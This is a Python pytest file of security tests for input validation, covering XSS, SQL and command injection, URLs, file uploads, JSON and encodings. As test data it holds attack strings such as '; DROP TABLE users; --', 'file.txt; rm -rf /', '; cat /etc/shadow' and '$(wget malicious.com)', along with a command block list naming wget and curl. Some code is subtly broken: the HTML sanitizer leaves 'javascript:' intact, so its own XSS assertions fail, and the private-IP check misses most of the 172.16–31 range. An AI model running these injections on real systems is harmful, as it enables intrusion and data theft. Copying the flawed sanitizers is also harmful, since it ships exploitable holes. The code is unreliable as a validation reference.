"""
Input Validation Security Tests
Comprehensive tests for input sanitization and validation
"""
import pytest
import re
import html
import urllib.parse
from unittest.mock import Mock, patch
from typing import Any, Dict, List, Optional, Union
import json
import base64


class TestInputSanitization:
    """Test input sanitization mechanisms"""
    
    @pytest.mark.security
    def test_html_sanitization(self):
        """Test HTML input sanitization"""
        def sanitize_html(input_text: str) -> str:
            """Basic HTML sanitization"""
            if not input_text:
                return ""
            
            # Escape HTML entities
            sanitized = html.escape(input_text)
            
            # Remove script tags
            sanitized = re.sub(r'<script.*?</script>', '', sanitized, flags=re.IGNORECASE | re.DOTALL)
            
            # Remove dangerous attributes
            dangerous_attrs = ['onload', 'onclick', 'onmouseover', 'onerror', 'onchange']
            for attr in dangerous_attrs:
                sanitized = re.sub(f'{attr}\\s*=\\s*[^\\s>]*', '', sanitized, flags=re.IGNORECASE)
            
            return sanitized
        
        # Test XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<div onclick='alert(\"XSS\")'>Click me</div>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>"
        ]
        
        for payload in xss_payloads:
            sanitized = sanitize_html(payload)
            assert "<script>" not in sanitized.lower()
            assert "javascript:" not in sanitized.lower()
            assert "onerror=" not in sanitized.lower()
            assert "onclick=" not in sanitized.lower()
    
    @pytest.mark.security
    def test_sql_injection_prevention(self):
        """Test SQL injection input validation"""
        def validate_sql_input(input_value: str) -> bool:
            """Validate input for SQL injection patterns"""
            if not input_value:
                return True
            
            # SQL injection patterns
            sql_patterns = [
                r"('|(\\'))",                    # Single quotes
                r"(;|\|)",                       # Semicolons and pipes
                r"(--|\#)",                      # SQL comments
                r"(union|select|insert|update|delete|drop|create|alter)",  # SQL keywords
                r"(\*|%)",                       # Wildcards
                r"(script|javascript|vbscript)"  # Script keywords
            ]
            
            input_lower = input_value.lower()
            
            for pattern in sql_patterns:
                if re.search(pattern, input_lower, re.IGNORECASE):
                    return False
            
            return True
        
        # Test safe inputs
        safe_inputs = [
            "John Doe",
            "john.doe@example.com",
            "Regular text content",
            "Product-123",
            "2024-01-01"
        ]
        
        for safe_input in safe_inputs:
            assert validate_sql_input(safe_input) is True
        
        # Test malicious inputs
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "UNION SELECT * FROM passwords",
            "<script>alert('xss')</script>"
        ]
        
        for malicious_input in malicious_inputs:
            assert validate_sql_input(malicious_input) is False
    
    @pytest.mark.security
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        def validate_command_input(input_value: str) -> bool:
            """Validate input for command injection"""
            if not input_value:
                return True
            
            # Command injection patterns
            dangerous_chars = [';', '|', '&', '$', '`', '(', ')', '{', '}', '[', ']']
            dangerous_commands = ['rm', 'del', 'format', 'shutdown', 'reboot', 'wget', 'curl']
            
            # Check for dangerous characters
            for char in dangerous_chars:
                if char in input_value:
                    return False
            
            # Check for dangerous commands
            words = input_value.lower().split()
            for word in words:
                if word in dangerous_commands:
                    return False
            
            return True
        
        # Test safe inputs
        safe_inputs = [
            "filename.txt",
            "data-export",
            "user_report_2024",
            "config.json"
        ]
        
        for safe_input in safe_inputs:
            assert validate_command_input(safe_input) is True
        
        # Test dangerous inputs
        dangerous_inputs = [
            "file.txt; rm -rf /",
            "data | cat /etc/passwd",
            "$(wget malicious.com)",
            "file.txt && shutdown",
            "; cat /etc/shadow"
        ]
        
        for dangerous_input in dangerous_inputs:
            assert validate_command_input(dangerous_input) is False


class TestDataValidation:
    """Test data validation and type checking"""
    
    @pytest.mark.security
    def test_email_validation(self):
        """Test email address validation"""
        def validate_email(email: str) -> bool:
            """Validate email format"""
            if not email or len(email) > 254:
                return False
            
            # Basic email regex
            pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
            
            if not re.match(pattern, email):
                return False
            
            # Additional security checks
            if '..' in email:  # Consecutive dots
                return False
            
            if email.startswith('.') or email.endswith('.'):
                return False
            
            return True
        
        # Test valid emails
        valid_emails = [
            "user@example.com",
            "test.email@domain.org",
            "user+tag@example.co.uk",
            "firstname.lastname@company.com"
        ]
        
        for email in valid_emails:
            assert validate_email(email) is True
        
        # Test invalid emails
        invalid_emails = [
            "invalid-email",
            "@domain.com",
            "user@",
            "user..name@domain.com",
            ".user@domain.com",
            "user@domain.com.",
            "user@domain",
            "a" * 250 + "@domain.com"  # Too long
        ]
        
        for email in invalid_emails:
            assert validate_email(email) is False
    
    @pytest.mark.security
    def test_url_validation(self):
        """Test URL validation and sanitization"""
        def validate_url(url: str) -> bool:
            """Validate URL format and security"""
            if not url:
                return False
            
            # Check for allowed schemes
            allowed_schemes = ['http', 'https', 'ftp', 'ftps']
            
            try:
                parsed = urllib.parse.urlparse(url)
                
                if parsed.scheme.lower() not in allowed_schemes:
                    return False
                
                # Block localhost and private IPs for external URLs
                dangerous_hosts = [
                    'localhost', '127.0.0.1', '0.0.0.0',
                    '10.', '192.168.', '172.16.', '172.31.'
                ]
                
                if any(parsed.netloc.startswith(host) for host in dangerous_hosts):
                    return False
                
                # Check for malicious URL patterns
                if 'javascript:' in url.lower():
                    return False
                
                if 'data:' in url.lower():
                    return False
                
                return True
                
            except Exception:
                return False
        
        # Test valid URLs
        valid_urls = [
            "https://example.com",
            "http://www.domain.org/path",
            "https://api.service.com/v1/endpoint",
            "ftp://files.example.com/file.txt"
        ]
        
        for url in valid_urls:
            assert validate_url(url) is True
        
        # Test invalid URLs
        invalid_urls = [
            "javascript:alert('xss')",
            "data:text/html,<script>alert()</script>",
            "file:///etc/passwd",
            "http://localhost/admin",
            "https://192.168.1.1/config",
            "gopher://malicious.com"
        ]
        
        for url in invalid_urls:
            assert validate_url(url) is False
    
    @pytest.mark.security
    def test_file_upload_validation(self):
        """Test file upload validation"""
        def validate_file_upload(filename: str, content_type: str, size: int) -> Dict[str, Any]:
            """Validate file upload"""
            result = {
                "valid": True,
                "errors": []
            }
            
            # Allowed file extensions
            allowed_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.pdf', '.txt', '.docx', '.xlsx']
            
            # Check file extension
            if filename:
                ext = '.' + filename.split('.')[-1].lower() if '.' in filename else ''
                if ext not in allowed_extensions:
                    result["valid"] = False
                    result["errors"].append(f"File extension {ext} not allowed")
            
            # Check content type
            allowed_content_types = [
                'image/jpeg', 'image/png', 'image/gif',
                'application/pdf', 'text/plain',
                'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
            ]
            
            if content_type not in allowed_content_types:
                result["valid"] = False
                result["errors"].append(f"Content type {content_type} not allowed")
            
            # Check file size (max 10MB)
            max_size = 10 * 1024 * 1024
            if size > max_size:
                result["valid"] = False
                result["errors"].append(f"File size {size} exceeds maximum {max_size}")
            
            # Check for dangerous filenames
            dangerous_patterns = [
                r'\.exe$', r'\.bat$', r'\.cmd$', r'\.scr$',
                r'\.php$', r'\.jsp$', r'\.asp$', r'\.sh$'
            ]
            
            for pattern in dangerous_patterns:
                if re.search(pattern, filename, re.IGNORECASE):
                    result["valid"] = False
                    result["errors"].append("Potentially dangerous file type")
                    break
            
            return result
        
        # Test valid uploads
        valid_upload = validate_file_upload("document.pdf", "application/pdf", 1024000)
        assert valid_upload["valid"] is True
        
        image_upload = validate_file_upload("photo.jpg", "image/jpeg", 512000)
        assert image_upload["valid"] is True
        
        # Test invalid uploads
        exe_upload = validate_file_upload("malware.exe", "application/octet-stream", 1024)
        assert exe_upload["valid"] is False
        
        large_upload = validate_file_upload("large.pdf", "application/pdf", 20 * 1024 * 1024)
        assert large_upload["valid"] is False


class TestInputLengthValidation:
    """Test input length and size validation"""
    
    @pytest.mark.security
    def test_string_length_validation(self):
        """Test string length validation"""
        def validate_string_length(value: str, min_length: int = 0, max_length: int = 255) -> bool:
            """Validate string length"""
            if not isinstance(value, str):
                return False
            
            return min_length <= len(value) <= max_length
        
        # Test valid strings
        assert validate_string_length("Valid input", 0, 100) is True
        assert validate_string_length("", 0, 100) is True
        assert validate_string_length("x" * 50, 0, 100) is True
        
        # Test invalid strings
        assert validate_string_length("x" * 300, 0, 255) is False
        assert validate_string_length("short", 10, 100) is False
        assert validate_string_length(None, 0, 100) is False
    
    @pytest.mark.security
    def test_json_payload_validation(self):
        """Test JSON payload size and structure validation"""
        def validate_json_payload(payload: str, max_size: int = 1024) -> Dict[str, Any]:
            """Validate JSON payload"""
            result = {
                "valid": True,
                "errors": [],
                "data": None
            }
            
            # Check payload size
            if len(payload.encode('utf-8')) > max_size:
                result["valid"] = False
                result["errors"].append(f"Payload size exceeds {max_size} bytes")
                return result
            
            # Try to parse JSON
            try:
                data = json.loads(payload)
                result["data"] = data
                
                # Check nesting depth
                def get_depth(obj, depth=0):
                    if isinstance(obj, dict):
                        return max(get_depth(v, depth + 1) for v in obj.values()) if obj else depth
                    elif isinstance(obj, list):
                        return max(get_depth(item, depth + 1) for item in obj) if obj else depth
                    return depth
                
                if get_depth(data) > 10:  # Max 10 levels deep
                    result["valid"] = False
                    result["errors"].append("JSON nesting too deep")
                
            except json.JSONDecodeError as e:
                result["valid"] = False
                result["errors"].append(f"Invalid JSON: {str(e)}")
            
            return result
        
        # Test valid JSON
        valid_json = '{"name": "John", "age": 30, "email": "john@example.com"}'
        result = validate_json_payload(valid_json)
        assert result["valid"] is True
        assert result["data"]["name"] == "John"
        
        # Test invalid JSON
        invalid_json = '{"name": "John", "age":}'
        result = validate_json_payload(invalid_json)
        assert result["valid"] is False
        
        # Test oversized JSON
        large_json = '{"data": "' + 'x' * 2000 + '"}'
        result = validate_json_payload(large_json, max_size=1024)
        assert result["valid"] is False


class TestDataTypeValidation:
    """Test data type validation and conversion"""
    
    @pytest.mark.security
    def test_integer_validation(self):
        """Test integer input validation"""
        def validate_integer(value: Any, min_val: int = None, max_val: int = None) -> bool:
            """Validate integer input"""
            try:
                int_val = int(value)
                
                if min_val is not None and int_val < min_val:
                    return False
                
                if max_val is not None and int_val > max_val:
                    return False
                
                return True
                
            except (ValueError, TypeError):
                return False
        
        # Test valid integers
        assert validate_integer("123") is True
        assert validate_integer(456) is True
        assert validate_integer("0") is True
        assert validate_integer(-10, min_val=-20) is True
        
        # Test invalid integers
        assert validate_integer("abc") is False
        assert validate_integer("12.34") is False
        assert validate_integer(None) is False
        assert validate_integer(150, max_val=100) is False
    
    @pytest.mark.security
    def test_float_validation(self):
        """Test float input validation"""
        def validate_float(value: Any, min_val: float = None, max_val: float = None) -> bool:
            """Validate float input"""
            try:
                float_val = float(value)
                
                # Check for NaN and infinity
                if not (float_val == float_val):  # NaN check
                    return False
                
                if float_val == float('inf') or float_val == float('-inf'):
                    return False
                
                if min_val is not None and float_val < min_val:
                    return False
                
                if max_val is not None and float_val > max_val:
                    return False
                
                return True
                
            except (ValueError, TypeError):
                return False
        
        # Test valid floats
        assert validate_float("12.34") is True
        assert validate_float(56.78) is True
        assert validate_float("0.0") is True
        
        # Test invalid floats
        assert validate_float("abc") is False
        assert validate_float(float('nan')) is False
        assert validate_float(float('inf')) is False
        assert validate_float(200.0, max_val=100.0) is False
    
    @pytest.mark.security
    def test_boolean_validation(self):
        """Test boolean input validation"""
        def validate_boolean(value: Any) -> bool:
            """Validate boolean input"""
            if isinstance(value, bool):
                return True
            
            if isinstance(value, str):
                return value.lower() in ['true', 'false', '1', '0', 'yes', 'no']
            
            if isinstance(value, int):
                return value in [0, 1]
            
            return False
        
        # Test valid booleans
        assert validate_boolean(True) is True
        assert validate_boolean(False) is True
        assert validate_boolean("true") is True
        assert validate_boolean("false") is True
        assert validate_boolean("1") is True
        assert validate_boolean("0") is True
        assert validate_boolean(1) is True
        assert validate_boolean(0) is True
        
        # Test invalid booleans
        assert validate_boolean("maybe") is False
        assert validate_boolean(2) is False
        assert validate_boolean(None) is False
        assert validate_boolean([]) is False


class TestEncodingValidation:
    """Test character encoding validation"""
    
    @pytest.mark.security
    def test_utf8_validation(self):
        """Test UTF-8 encoding validation"""
        def validate_utf8(data: bytes) -> bool:
            """Validate UTF-8 encoding"""
            try:
                data.decode('utf-8')
                return True
            except UnicodeDecodeError:
                return False
        
        # Test valid UTF-8
        valid_utf8 = "Hello, 世界! 🌍".encode('utf-8')
        assert validate_utf8(valid_utf8) is True
        
        # Test invalid UTF-8
        invalid_utf8 = b'\xff\xfe\xfd'
        assert validate_utf8(invalid_utf8) is False
    
    @pytest.mark.security
    def test_base64_validation(self):
        """Test Base64 encoding validation"""
        def validate_base64(data: str) -> bool:
            """Validate Base64 encoding"""
            try:
                # Check if string is valid base64
                if len(data) % 4 != 0:
                    return False
                
                base64.b64decode(data, validate=True)
                return True
            except Exception:
                return False
        
        # Test valid Base64
        valid_b64 = base64.b64encode(b"Hello World").decode('ascii')
        assert validate_base64(valid_b64) is True
        
        # Test invalid Base64
        assert validate_base64("Invalid!@#$") is False
        assert validate_base64("SGVsbG8gV29ybGQ") is False  # Missing padding